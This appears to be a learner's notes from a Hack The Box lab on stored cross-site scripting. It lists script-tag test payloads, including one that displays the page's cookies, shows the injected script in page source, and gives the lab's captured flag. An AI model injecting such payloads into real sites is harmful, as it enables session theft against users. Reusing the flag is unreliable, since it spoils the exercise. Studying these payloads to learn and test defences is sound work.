# Stored XSS

XSS Testing Payloads
<script>alert(window.origin)</script>

We can confirm this further by looking page source by clicking [CTRL+U] Or View Page Source :

<div></div><ul class="list-unstyled" id="todo"><ul><script>alert(window.origin)</script>
</ul></ul>

Another easy-to-spot payload is <script>print()</script> 

## LAB

<script>alert(window.origin)</script>
<script>alert(document.cookie)</script>

cookie=HTB{570r3d_f0r_3v3ry0n3_70_533}
